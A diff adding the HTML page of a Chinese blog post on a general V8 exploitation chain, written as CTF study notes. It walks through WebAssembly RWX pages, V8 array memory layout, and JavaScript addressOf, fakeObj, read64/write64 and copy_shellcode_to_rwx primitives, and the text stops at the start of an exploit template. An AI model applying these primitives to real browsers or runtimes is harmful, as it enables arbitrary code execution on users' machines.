@@ -1,0 +1,729 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="（咕咕咕了好久……）基础pwn暂时告一段落了，本来打算开kernel的，但XCTF见到了V8所以研究一下。配环境真坐牢……本来都配好了虚拟机不小心被我玩崩了还没备份(╯▔皿▔)╯还因为一些很屑的原因（少加了双引号(ˉ▽ˉ；)…）又花了好久再配了一遍……ps：目前的学习按照从“0开始学V8漏洞利用”系列进行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V8通用利用链">
+<meta property="og:url" content="http://akaieurus.github.io/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="（咕咕咕了好久……）基础pwn暂时告一段落了，本来打算开kernel的，但XCTF见到了V8所以研究一下。配环境真坐牢……本来都配好了虚拟机不小心被我玩崩了还没备份(╯▔皿▔)╯还因为一些很屑的原因（少加了双引号(ˉ▽ˉ；)…）又花了好久再配了一遍……ps：目前的学习按照从“0开始学V8漏洞利用”系列进行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc42.jpg">
+<meta property="article:published_time" content="2023-04-12T15:32:07.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:40:15.476Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc42.jpg">
+  
+  
+  
+  <title>V8通用利用链 - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc42.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="V8通用利用链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-12 23:32" pubdate>
+          2023年4月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">V8通用利用链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>（咕咕咕了好久……）基础pwn暂时告一段落了，本来打算开kernel的，但XCTF见到了V8所以研究一下。配环境真坐牢……本来都配好了虚拟机不小心被我玩崩了还没备份(╯▔皿▔)╯还因为一些很屑的原因（少加了双引号(ˉ▽ˉ；)…）又花了好久再配了一遍……<br>ps：目前的学习按照从“0开始学V8漏洞利用”系列进行</p>
+<span id="more"></span>
+
+<h1 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h1><p>做pwn题的时候我们的目标往往就是执行system(‘&#x2F;bin&#x2F;sh’)，V8利用的目标就是执行任意shellcode，要达成这个目标我们就需要读写相关漏洞+一段rwx的内存<br>wasm可以为我们制造rwx的内存<br>ps：wasm无法执行shellcode（还不清楚为啥，之后再研究），所以直接写shellcode什么的别想了o( ￣▽￣)ブ<br>pps：在别的博客里还有用常规堆题思路做的，之后再研究<br>所以我们的思路就是先生成一段合法的wasm再写入非法的shellcode<br>test.js如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%<span class="hljs-title class_">SystemBreak</span>();<br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br>%<span class="hljs-title class_">DebugPrint</span>(f);<br>%<span class="hljs-title class_">DebugPrint</span>(wasmInstance);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure>
+<p>第二个断点时vmmap一下有一段rwx的内存</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/rwx.png" srcset="/img/loading.gif" lazyload class title="rwx">
+<p>变量f（函数对象）的相关信息：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/f.png" srcset="/img/loading.gif" lazyload class title="f">
+<p>经调试我们可以发现f.shared_info.data.instance&#x3D;&amp;wasmInstance（先不纠结这些属性到底是啥）<br>shared_info：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/shared_info.png" srcset="/img/loading.gif" lazyload class title="shared_info">
+<p>data：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/data.png" srcset="/img/loading.gif" lazyload class title="data">
+<p>wasmInstance：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/wasminstance.png" srcset="/img/loading.gif" lazyload class title="wasminstance">
+<p>instance：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/instance.png" srcset="/img/loading.gif" lazyload class title="instance">
+<p>可见rwx的地址写在instance+0x68的位置，我们要把shellcode写在这</p>
+<h1 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h1><h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><p>test.js如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">a = [<span class="hljs-number">2.1</span>];<br>b = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br>c = [b];<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">DebugPrint</span>(b);<br>%<span class="hljs-title class_">DebugPrint</span>(c);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure>
+<p>首先来看a的内存布局：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/a.png" srcset="/img/loading.gif" lazyload class title="a">
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/aa.png" srcset="/img/loading.gif" lazyload class title="aa">
+<ul>
+<li><p>0x142508049970-0x142508049980的部分是a的结构体</p>
+</li>
+<li><p>V8将最后一位置1表示指针，置0表示SMI当前版本的V8对地址进行了压缩，因为高32bit的地址值是一样的</p>
+</li>
+<li><p>所以a的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements addr|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure>
+
+<p>elements结构内存布局如下：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/elements.png" srcset="/img/loading.gif" lazyload class title="elements">
+</li>
+<li><p>0x142508049960-0x142508049970的部分是elements结构</p>
+</li>
+<li><p>elements的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">|<span class="hljs-number">32</span> bit <span class="hljs-built_in">map</span> addr|<span class="hljs-number">32</span> bit length|value|<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>发现elements结构之后是紧接着就是a的结构，如果让elements溢出我们就能控制a的map和length结构<br>b的内存：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/b.png" srcset="/img/loading.gif" lazyload class title="b">
+<p>c的内存：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/c.png" srcset="/img/loading.gif" lazyload class title="c">
+<p>c的内存和a的内存分布基本一致</p>
+<h2 id="任意变量地址读"><a href="#任意变量地址读" class="headerlink" title="任意变量地址读"></a>任意变量地址读</h2><p>JSArray用map结构来区分储存的数据类型（elements kind），如果我们将c的map地址改成a的，那么执行c[0]时就会将b的地址当成浮点数来解析（类型混淆），可以用来泄露变量地址，步骤如下：</p>
+<ul>
+<li>将c[0]的值设置为想要获取地址的变量，比如a</li>
+<li>通过漏洞将c的map地址改成a的</li>
+<li>读取c[0]的值，该值为a的低32bit地址<br>上述步骤可被封装为addressOf函数</li>
+</ul>
+<h2 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h2><p>同理我们也可以把浮点型数组变成对象型数组，步骤如下：</p>
+<ul>
+<li>将a[0]的值设为构造的对象地址+1</li>
+<li>通过漏洞将a的map地址修改成c的</li>
+<li>获取a[0]的值<br>这个过程可以被封装成fakeObj函数</li>
+</ul>
+<h2 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h2><p>构造这样一个变量：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[<br>	double_array_map,<br>	<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br></code></pre></td></tr></table></figure>
+<p>变量结构如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(elements)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit length|<span class="hljs-number">64</span> bit double_array_map|<span class="hljs-number">64</span> bit <span class="hljs-number">0x4141414141414141n</span>|<br>(fake_array)<br>|<span class="hljs-number">32</span> bit map addr|<span class="hljs-number">32</span> bit properties addr|<span class="hljs-number">32</span> bit elements|<span class="hljs-number">32</span> bit length|<br></code></pre></td></tr></table></figure>
+<p>可以用addressOf获取fake_array地址，-0x10得到fake_object地址（用double_array_map伪造map和properties，用itof(0x4141414141414141)伪造elements和length），然后使用fakeObj函数将浮点数组伪造成对象数组<br>以上过程可以打包成任意读函数read64：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64_addr</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125; <br></code></pre></td></tr></table></figure>
+<h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><p>同理也能构造任意写函数write64：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> fake_array=[double_array_map,<span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64_addr</span>(<span class="hljs-params">addr,data</span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br>    <span class="hljs-keyword">var</span> fake_object_addr=fake_array_addr-<span class="hljs-number">0x10n</span>;<br>    <span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObject</span>(fake_object_addr);<br>    fake_array[<span class="hljs-number">1</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">8n</span>+<span class="hljs-number">1n</span>);<br>    fake_object[<span class="hljs-number">0</span>]=data;<br>&#125; <br></code></pre></td></tr></table></figure>
+<h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p>但上述任意写没法把shellcode写入rwx区域，因为写入的地址&#x3D;实际地址-0x8+0x1，还需要伪造64bit的map和length，但需要写入shellcode的地址是rwx地址段的起始位置，所以我们无法伪造map和length（我的理解是正常的elements结构有map和length且正常改写需要合法的这两个结构），需要另辟蹊径<br>测试代码test.js如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>data_view.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-literal">true</span>);<br><br>%<span class="hljs-title class_">DebugPrint</span>(data_buf);<br>%<span class="hljs-title class_">DebugPrint</span>(data_view);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure>
+<p>data_buf变量的结构如下：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/buf.png" srcset="/img/loading.gif" lazyload class title="buf">
+<p>再看看backing_store字段的值：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/backstore.png" srcset="/img/loading.gif" lazyload class title="backstore">
+<p>double型的2.0的十六进制表示就是0x4000000000000000，没有map和length，我们可以利用此类型将shellcode写入rwx内存<br>看看data_buf的内存布局：</p>
+<img src="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/bufbuf.png" srcset="/img/loading.gif" lazyload class title="bufbuf">
+<p>backing_store字段在data_buf+0x1c<br>将上述步骤封装成copy_shellcode_to_rwx函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="类型混淆类漏洞模板"><a href="#类型混淆类漏洞模板" class="headerlink" title="类型混淆类漏洞模板"></a>类型混淆类漏洞模板</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 